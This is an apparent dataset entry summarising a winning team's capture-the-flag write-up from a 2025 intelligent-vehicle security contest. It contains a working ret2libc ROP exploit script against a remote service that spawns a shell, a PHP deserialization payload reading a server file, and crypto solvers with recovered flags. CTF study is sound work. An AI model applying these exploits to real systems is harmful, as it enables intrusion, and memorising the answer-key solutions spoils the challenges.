---
title: 首届CCF智能汽车大赛(CCF IVC 2025) Mini-Venom(第一名)
contest: CCF智能汽车大赛
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags: [Pwn-ROP,libc-2.27,Web-Hash长度扩展,PHP反序列化,Maker+Post+SplFileObject,git泄露,Crypto-Pell方程,ECDLP简化DLP,sieve_base爆破,nfsr+ff函数,bool约束]
attack_chain: Pwn-3: pop_rdi+pop_rsi+write@plt+write_got+write(1,write_got)泄libc_base|easylogin: ?source=1源码+hash长度扩展+base64+token提交|serp: git泄露+posts.php Maker+Post+__toString+SplFileObject+__construct('SplFileObject', ['f1a9.php', 'r'])|Curve: gx^2-D*gy^2-1=ax^2-D*ay^2-1移项gcd得p_approximate+sieve_base试除p+GF(p)iroot(D,2)+映射到x+dy离散对数discrete_log+share^pell_b XOR n_a+shared_secret=(share+share_inv)/2+AES-ECB解密|nfsr: lfsr 128位+ff(x1,x2,x3,x4) sha512+输出256位+循环300次爆破key
key_payload: b'a'*0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)|a = new Maker('SplFileObject', ['f1a9.php', 'r']); b = (new Post('test'))->setContent($a); c = [$b];|kp1 = gx**2 - D * gy**2 - 1; kp2 = ax**2 - D * ay**2 - 1; p_approximate = int(gcd(kp1, kp2)); for prime in sieve_base[:20]: if p_approximate % prime == 0: p = p_approximate // prime; if isPrime(p): break|F = GF(p); d = F(gmpy2.iroot(D,2)[0]); pell_g = F(G[0]) + F(G[1])*d; pell_a = F(A[0]) + F(A[1])*d; pell_b = F(B[0]) + F(B[1])*d; n_a = discrete_log(pell_a, pell_g); share = pell_b ^ n_a; share_inv = share ^ (-1); shared_secret = (share + share_inv) / F(2); key = sha256(long_to_bytes(int(shared_secret))).digest(); cipher = AES.new(key, AES.MODE_ECB); flag = cipher.decrypt(C)|lfsr(R, mask): R_bin[0]=s=sum(R_bin[i]*mask_bin[i])&1, R_bin = [s] + R_bin[:-1]|ff(x0,x1,x2,x3) = int(sha512(long_to_bytes(x0*x2+x0+x1^4+x3^5+x0*x1*x2*x3+(x1*x3)^4)).hexdigest(), 16) & 1
one_liner: 首届CCF IVC 2025 Mini-Venom第一名:车联网pwn-3(0x88栈溢出+ret2libc)+easylogin(hash长度扩展)+serp(git+PHP反序列化SplFileObject读f1a9.php)+Curve(Pell方程x^2-Dy^2=1+ECDLP简化DLP+sieve_base爆破p+离散对数)+nfsr(128位LFSR+ff函数SHA512+bool约束爆破key)
lesson: 1) 车联网pwn:pop_rdi+pop_rsi链泄libc_base=write_got leak+ret2libc system;2) hash长度扩展攻击:hash(secret+padding+append) + new_hash;3) SplFileObject反序列化读源:new Maker('SplFileObject', ['f1a9.php', 'r']);4) Pell方程解的gcd得p:gx^2-D*gy^2-1=ax^2-D*ay^2-1;5) 离散对数discrete_log(EG);6) LFSR+ff=bool约束爆破:循环300次稳定预测
quality: high
---

## 备注

原文(https://www.ctfiot.com/263528.html)首届CCF智能汽车大赛(CCF IVC 2025),ChaMd5 Mini-Venom战队第一名,末尾招新广告。

### 题目详情

**Pwn-3 (车联网ROP)**
```python
from gt import *
con("amd64")
io = remote("124.133.253.44", 33046)
libc = ELF("./libc-2.27.so")
write_plt = 0x400450
write_got = 0x601018
pop_rdi = 0x400643
pop_rsi = 0x400641
payload = b'a'*0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)
io.sendline(payload)
io.recvuntil("\x50")
libc_base = u64(io.recv(7).rjust(8, b'\x00')) + 0x50 - libc.sym["write"]
system = libc_base + libc.sym["system"]
binsh = libc_base + next(libc.search("/bin/sh"))
payload = b'a'*0x88 + p64(pop_rdi) + p64(binsh) + p64(system)
io.sendline(payload)
io.interactive()
# flag{70c6a4340c6c5bb3b0b34a8caa9a872f}
```

**Web-easylogin / serp**

easylogin: ?source=1源码+hash长度扩展攻击
serp: git泄露+反序列化
```php
$a = new Maker('SplFileObject', ['f1a9.php', 'r']);
$b = (new Post('test'))->setContent($a);
$c = [$b];
echo urlencode(serialize($c));
```

**Crypto-Curve (Pell方程)**
```python
D = 841
G, A, B = (...), (...), (...)
kp1 = gx**2 - D * gy**2 - 1
kp2 = ax**2 - D * ay**2 - 1
p_approximate = int(gcd(kp1, kp2))
for prime in sieve_base[:20]:
    if p_approximate % prime == 0:
        p = p_approximate // prime
        if isPrime(p): break

F = GF(p)
d = F(gmpy2.iroot(D, 2)[0])
pell_g = F(G[0]) + F(G[1]) * d
pell_a = F(A[0]) + F(A[1]) * d
pell_b = F(B[0]) + F(B[1]) * d
n_a = discrete_log(pell_a, pell_g)
share = pell_b ^ n_a
share_inv = share ^ (-1)
shared_secret = (share + share_inv) / F(2)
key = sha256(long_to_bytes(int(shared_secret))).digest()
cipher = AES.new(key, AES.MODE_ECB)
flag = cipher.decrypt(C)
```

**Crypto-nfsr (LFSR+ff)**
```python
def lfsr(R, mask):
    R_bin = [int(b) for b in bin(R)[2:].zfill(128)]
    mask_bin = [int(b) for b in bin(mask)[2:].zfill(128)]
    s = sum([R_bin[i] * mask_bin[i] for i in range(128)]) & 1
    R_bin = [s] + R_bin[:-1]
    return (int("".join(map(str, R_bin)), 2), s)

def ff(x0, x1, x2, x3):
    return (int(sha512(long_to_bytes(x0*x2 + x0 + x1**4 + x3**5 + x0*x1*x2*x3 + (x1*x3)**4)).hexdigest(), 16) & 1)

def round(R, R1_mask, R2_mask, R3_mask, R4_mask):
    out = 0
    R1_NEW, _ = lfsr(R, R1_mask)
    R2_NEW, _ = lfsr(R, R2_mask)
    R3_NEW, _ = lfsr(R, R3_mask)
    R4_NEW, _ = lfsr(R, R4_mask)
    for _ in range(256):
        R1_NEW, x1 = lfsr(R1_NEW, R1_mask)
        R2_NEW, x2 = lfsr(R2_NEW, R2_mask)
        R3_NEW, x3 = lfsr(R3_NEW, R3_mask)
        R4_NEW, x4 = lfsr(R4_NEW, R4_mask)
        out = (out << 1) + ff(x1, x2, x3, x4)
    return out
```

## 评级

- **quality: high** — 多方向4题(车联网Pwn+Web+Curve+流密码),Mini-Venom第一名全链
- **vuln_type: pwn_unknown** — 主分类PWN
- 实战价值:车联网PWN+Pell方程ECDLP+LFSR+ff bool约束是CCF高阶考点
